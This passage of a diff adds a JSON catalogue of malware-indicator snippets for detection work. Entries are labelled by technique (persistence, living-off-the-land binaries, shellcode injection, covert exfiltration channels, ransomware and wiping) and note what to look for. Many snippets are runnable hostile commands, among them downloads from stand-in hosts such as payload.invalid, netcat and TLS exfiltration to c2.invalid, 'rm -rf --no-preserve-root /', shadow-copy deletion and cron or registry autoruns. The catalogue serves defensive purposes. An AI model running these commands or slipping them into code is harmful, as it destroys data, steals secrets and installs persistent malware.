+      "snippet": "import keyring; keyring.get_password(\"service\",\"user\")",
+      "look_for": "OS keyring access",
+      "why_it_matters": "Credential retrieval API."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "PowerShell",
+      "snippet": "schtasks /create /sc minute /mo 30 /tn Updater /tr \"powershell -w hidden -File $env:TEMP\\u.ps1\"",
+      "look_for": "scheduled task creation",
+      "why_it_matters": "Persistence via scheduler."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "Bash",
+      "snippet": "echo \"@reboot /tmp/.svc\" | crontab -",
+      "look_for": "@reboot cron entry",
+      "why_it_matters": "Persistence on reboot."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "JavaScript",
+      "snippet": "fs.writeFileSync(path.join(os.homedir(), \".config/autostart/updater.desktop\"), desktopEntry)",
+      "look_for": "drops autostart entry",
+      "why_it_matters": "Desktop persistence."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "Python",
+      "snippet": "open(os.path.expanduser(\"~/.bashrc\"),\"a\").write(\"\\npython3 ~/.cache/.agent.py &\\n\")",
+      "look_for": "startup file modification",
+      "why_it_matters": "Shell-profile persistence."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "PowerShell",
+      "snippet": "New-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name Updater -Value $env:TEMP\\u.exe",
+      "look_for": "Run registry key",
+      "why_it_matters": "Windows autorun."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "Bash",
+      "snippet": "systemctl --user enable updater.service",
+      "look_for": "installs user service",
+      "why_it_matters": "Persistent service."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "Java",
+      "snippet": "Files.writeString(Path.of(System.getProperty(\"user.home\"), \".config\", \"autostart\", \"sync.desktop\"), payload)",
+      "look_for": "autostart desktop file",
+      "why_it_matters": "Persistence file drop."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "Ruby",
+      "snippet": "File.write(File.expand_path(\"~/.profile\"), \"\\nnohup ruby ~/.cache/.u.rb &\\n\", mode:\"a\")",
+      "look_for": "profile append",
+      "why_it_matters": "Persistence in profile."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "Go",
+      "snippet": "exec.Command(\"schtasks\",\"/create\",\"/sc\",\"daily\",\"/tn\",\"sync\",\"/tr\",payload).Run()",
+      "look_for": "creates scheduled task",
+      "why_it_matters": "Task-based persistence."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "JavaScript",
+      "snippet": "require(\"child_process\").exec(\"crontab -l; echo '*/15 * * * * ~/.cache/.u' | crontab -\")",
+      "look_for": "cron tampering",
+      "why_it_matters": "Recurring execution."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "Python",
+      "snippet": "with open(\"/etc/rc.local\",\"a\") as f: f.write(\"\\n/usr/local/bin/.svc &\\n\")",
+      "look_for": "boot script edit",
+      "why_it_matters": "System persistence."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "PowerShell",
+      "snippet": "Copy-Item agent.ps1 \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\agent.ps1\"",
+      "look_for": "Startup folder drop",
+      "why_it_matters": "Simple persistence."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "Bash",
+      "snippet": "ln -sf ~/.cache/.u ~/.config/autostart/.u",
+      "look_for": "odd hidden autostart link",
+      "why_it_matters": "Startup persistence."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "JavaScript",
+      "snippet": "app.setLoginItemSettings({ openAtLogin: true, path: process.execPath })",
+      "look_for": "Electron auto-start",
+      "why_it_matters": "Persistence in desktop apps."
+    },
+    {
+      "type": "malware",
+      "category": "Persistence: Autoruns / Scheduled Tasks",
+      "language": "Python",
+      "snippet": "launchctl load ~/Library/LaunchAgents/com.sync.agent.plist",
+      "look_for": "LaunchAgent registration",
+      "why_it_matters": "macOS persistence."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "PowerShell",
+      "snippet": "certutil -urlcache -f https://payload.invalid/a.exe a.exe",
+      "look_for": "certutil download",
+      "why_it_matters": "Living-off-the-land download."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "PowerShell",
+      "snippet": "mshta https://payload.invalid/a.hta",
+      "look_for": "mshta remote execution",
+      "why_it_matters": "LOLBins execution."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "PowerShell",
+      "snippet": "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();",
+      "look_for": "rundll32 with script",
+      "why_it_matters": "LOLBin abuse."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "Bash",
+      "snippet": "python3 -c \"import socket,subprocess,os;...\"",
+      "look_for": "interpreter abuse for shell",
+      "why_it_matters": "Scripting interpreter misuse."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "JavaScript",
+      "snippet": "require(\"child_process\").exec(\"powershell -nop -w hidden -enc ...\")",
+      "look_for": "spawns encoded PowerShell",
+      "why_it_matters": "Proxy execution."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "Python",
+      "snippet": "subprocess.run([\"regsvr32\",\"/s\",\"/n\",\"/u\",\"/i:https://payload.invalid/file.sct\",\"scrobj.dll\"])",
+      "look_for": "regsvr32 scriptlet pattern",
+      "why_it_matters": "LOLBin remote execution."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "Bash",
+      "snippet": "osascript -e 'do shell script \"curl -fsSL https://payload.invalid/m | sh\"'",
+      "look_for": "AppleScript shell bridge",
+      "why_it_matters": "Interpreter abuse."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "PowerShell",
+      "snippet": "wmic process call create \"powershell -nop -enc ...\"",
+      "look_for": "wmic spawns payload",
+      "why_it_matters": "LOLBin execution."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "Java",
+      "snippet": "new ProcessBuilder(\"cmd\",\"/c\",\"bitsadmin /transfer j https://payload.invalid/a.exe %TEMP%\\a.exe\").start();",
+      "look_for": "bitsadmin download",
+      "why_it_matters": "Native utility abuse."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "Ruby",
+      "snippet": "system(\"powershell -ExecutionPolicy Bypass -File u.ps1\")",
+      "look_for": "bypass execution policy",
+      "why_it_matters": "Suspicious scripting invocation."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "Go",
+      "snippet": "exec.Command(\"msbuild\",\"evil.xml\").Run()",
+      "look_for": "msbuild abuse",
+      "why_it_matters": "Build tool used for execution."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "JavaScript",
+      "snippet": "exec(\"regsvr32 /s /u /n /i:https://payload.invalid/s.sct scrobj.dll\")",
+      "look_for": "remote scriptlet execution",
+      "why_it_matters": "Common LOLBin pattern."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "Python",
+      "snippet": "os.system(\"certutil -decode payload.b64 payload.exe\")",
+      "look_for": "certutil decode step",
+      "why_it_matters": "Payload staging."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "PowerShell",
+      "snippet": "InstallUtil.exe /logfile= /LogToConsole=false /U bad.dll",
+      "look_for": "InstallUtil abuse",
+      "why_it_matters": "Signed binary proxy execution."
+    },
+    {
+      "type": "malware",
+      "category": "LOLBins / Scripting Abuse",
+      "language": "Bash",
+      "snippet": "php -r 'eval(file_get_contents(\"https://payload.invalid/p\"));'",
+      "look_for": "legit interpreter abused",
+      "why_it_matters": "Proxy execution through interpreter."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "C",
+      "snippet": "memcpy(buf, shellcode, sizeof(shellcode)); ((void(*)())buf)();",
+      "look_for": "shellcode buffer execution",
+      "why_it_matters": "Direct in-memory execution."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "C#",
+      "snippet": "VirtualAlloc(...); Marshal.Copy(sc,0,addr,sc.Length); CreateThread(...);",
+      "look_for": "VirtualAlloc + CreateThread",
+      "why_it_matters": "Classic injection chain."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "PowerShell",
+      "snippet": "[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$addr,$sc.Length)",
+      "look_for": "memory copy of shellcode",
+      "why_it_matters": "In-memory payload staging."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "Python",
+      "snippet": "ctypes.CFUNCTYPE(None)(ctypes.addressof(buf))()",
+      "look_for": "ctypes executes memory buffer",
+      "why_it_matters": "In-memory execution."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "Go",
+      "snippet": "syscall.Syscall(addr,0,0,0,0)",
+      "look_for": "raw syscall to memory address",
+      "why_it_matters": "Low-level execution."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "Java",
+      "snippet": "ByteBuffer.allocateDirect(sc.length)",
+      "look_for": "native buffer for shellcode",
+      "why_it_matters": "Suspicious memory staging."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "Rust",
+      "snippet": "std::mem::transmute::<*const u8, fn()>(ptr)()",
+      "look_for": "transmute function pointer",
+      "why_it_matters": "Buffer-to-code trick."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "C",
+      "snippet": "mprotect(buf, len, PROT_EXEC); ((int(*)())buf)();",
+      "look_for": "mark executable then call",
+      "why_it_matters": "Executable memory region."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "C#",
+      "snippet": "QueueUserAPC(addr, hThread, IntPtr.Zero)",
+      "look_for": "APC injection primitive",
+      "why_it_matters": "Injection technique."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "Python",
+      "snippet": "mmap.mmap(-1, len(sc), prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)",
+      "look_for": "RWX memory mapping",
+      "why_it_matters": "Unusual executable memory."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "PowerShell",
+      "snippet": "$win32::VirtualProtect($addr,$len,0x40,[ref]0)",
+      "look_for": "VirtualProtect to RX",
+      "why_it_matters": "Enables execution."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "Go",
+      "snippet": "windows.VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &old)",
+      "look_for": "RWX permissions",
+      "why_it_matters": "Memory execution indicator."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "C",
+      "snippet": "CreateRemoteThread(hProc,NULL,0,(LPTHREAD_START_ROUTINE)addr,NULL,0,NULL)",
+      "look_for": "remote thread start",
+      "why_it_matters": "Process injection."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "C#",
+      "snippet": "WriteProcessMemory(hProc, remote, buf, buf.Length, out _)",
+      "look_for": "writes bytes to other process",
+      "why_it_matters": "Injection precursor."
+    },
+    {
+      "type": "malware",
+      "category": "Shellcode / Memory Injection",
+      "language": "Python",
+      "snippet": "proc = ctypes.windll.kernel32.OpenProcess(0x1F0FFF,False,pid)",
+      "look_for": "opens process with full rights",
+      "why_it_matters": "Potential injection chain."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "JavaScript",
+      "snippet": "fetch(\"https://cdn.invalid/pixel.gif?d=\"+btoa(data))",
+      "look_for": "exfil hidden in image-like request",
+      "why_it_matters": "Blends with web traffic."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Python",
+      "snippet": "dns.resolver.resolve(chunk + \".exfil.invalid\",\"TXT\")",
+      "look_for": "DNS-based data channel",
+      "why_it_matters": "Covert exfil via DNS."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "PowerShell",
+      "snippet": "Invoke-WebRequest https://cdn.invalid/a.css?x=$([Convert]::ToBase64String($data))",
+      "look_for": "looks like asset fetch",
+      "why_it_matters": "Disguised traffic."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Bash",
+      "snippet": "printf \"%s\" \"$blob\" | nc c2.invalid 443",
+      "look_for": "raw netcat channel",
+      "why_it_matters": "Direct socket exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Go",
+      "snippet": "http.NewRequest(\"GET\",\"https://api.invalid/ping\",nil).Header.Set(\"X-Data\",enc)",
+      "look_for": "data in headers",
+      "why_it_matters": "Covert transport."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Java",
+      "snippet": "req.setHeader(\"Cookie\", encData)",
+      "look_for": "smuggles data in cookie header",
+      "why_it_matters": "Covert channel."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Ruby",
+      "snippet": "UDPSocket.new.send(data,0,\"c2.invalid\",53)",
+      "look_for": "unexpected UDP to 53",
+      "why_it_matters": "Suspicious DNS-like traffic."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Python",
+      "snippet": "ssl.wrap_socket(sock).send(blob)",
+      "look_for": "custom encrypted exfil socket",
+      "why_it_matters": "Bypasses simple inspection."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "JavaScript",
+      "snippet": "new Image().src=\"https://img.invalid/p.gif?x=\"+btoa(localStorage.token)",
+      "look_for": "image beacon exfil",
+      "why_it_matters": "Stealthy browser exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "PowerShell",
+      "snippet": "[System.Net.Sockets.TcpClient]::new(\"c2.invalid\",443)",
+      "look_for": "raw outbound socket",
+      "why_it_matters": "Custom C2 transport."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Bash",
+      "snippet": "openssl s_client -quiet -connect c2.invalid:443 < secret.txt",
+      "look_for": "TLS tunnel for file send",
+      "why_it_matters": "Encrypted exfil channel."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Go",
+      "snippet": "websocket.DefaultDialer.Dial(\"wss://c2.invalid/ws\",nil)",
+      "look_for": "websocket covert channel",
+      "why_it_matters": "Interactive hidden traffic."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Python",
+      "snippet": "requests.get(\"https://api.invalid/p\", headers={\"If-None-Match\": secret})",
+      "look_for": "hides data in common header",
+      "why_it_matters": "Covert header exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "JavaScript",
+      "snippet": "navigator.sendBeacon(\"https://stats.invalid/e\", blob)",
+      "look_for": "analytics-like exfil",
+      "why_it_matters": "Abuses common browser API."
+    },
+    {
+      "type": "malware",
+      "category": "Network Evasion / Covert Channels",
+      "language": "Ruby",
+      "snippet": "Net::HTTP.start(\"c2.invalid\",443,use_ssl:true){|h| h.request(req)}",
+      "look_for": "custom HTTPS channel",
+      "why_it_matters": "Remote control/exfil transport."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "Python",
+      "snippet": "for p in Path.home().rglob(\"*\"): p.rename(str(p)+\".locked\")",
+      "look_for": "bulk file rename loop",
+      "why_it_matters": "Ransomware-style file impact."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "Bash",
+      "snippet": "find ~/Documents -type f -exec sh -c '>\"$1\"' _ {} \\;",
+      "look_for": "destructive file clobbering",
+      "why_it_matters": "Data destruction."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "PowerShell",
+      "snippet": "Get-ChildItem $HOME -Recurse | % { Clear-Content $_.FullName }",
+      "look_for": "recursive content wipe",
+      "why_it_matters": "Destructive pattern."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "JavaScript",
+      "snippet": "fs.readdirSync(home,{recursive:true}).forEach(f=>fs.writeFileSync(f,\"\"))",
+      "look_for": "overwrite many files",
+      "why_it_matters": "Bulk wipe."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "Python",
+      "snippet": "key=Fernet.generate_key(); open(\"NOTE.txt\",\"w\").write(\"pay me\")",
+      "look_for": "ransom note artifact",
+      "why_it_matters": "Ransomware signal."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "Go",
+      "snippet": "exec.Command(\"sh\",\"-c\",\"find /srv -type f -delete\").Run()",
+      "look_for": "mass deletion",
+      "why_it_matters": "Destructive behavior."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "Ruby",
+      "snippet": "Dir.glob(\"/home/user/**/*\").each{|f| File.write(f, \"\") rescue nil }",
+      "look_for": "recursive wipe",
+      "why_it_matters": "Bulk destruction."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "PHP",
+      "snippet": "foreach (glob(\"/var/www/*\") as $f) unlink($f);",
+      "look_for": "mass unlink",
+      "why_it_matters": "Web-root destruction."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "PowerShell",
+      "snippet": "vssadmin delete shadows /all /quiet",
+      "look_for": "shadow copy deletion",
+      "why_it_matters": "Anti-recovery behavior."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "Bash",
+      "snippet": "rm -rf --no-preserve-root /",
+      "look_for": "catastrophic delete",
+      "why_it_matters": "Obviously destructive."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "Java",
+      "snippet": "Files.walk(Path.of(\"/data\")).forEach(Files::delete);",
+      "look_for": "recursive delete walker",
+      "why_it_matters": "Large-scale deletion."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "Python",
+      "snippet": "subprocess.run([\"gpg\",\"-c\",\"--batch\",\"--passphrase\",pw,file])",
+      "look_for": "encrypt files in bulk",
+      "why_it_matters": "Suspicious encryption workflow."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "JavaScript",
+      "snippet": "for (const f of files) fs.renameSync(f, f+\".encrypted\")",
+      "look_for": "mass extension change",
+      "why_it_matters": "Ransomware hallmark."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "PowerShell",
+      "snippet": "cipher /w:C",
+      "look_for": "disk wiping/free-space wipe",
+      "why_it_matters": "Anti-recovery/destruction."
+    },
+    {
+      "type": "malware",
+      "category": "Ransom / Destructive Patterns",
+      "language": "Go",
+      "snippet": "for _,f := range files { os.Rename(f, f+\".deadbolt\") }",
+      "look_for": "mass extension rename",
+      "why_it_matters": "Ransom behavior."
+    }
+  ]
+}
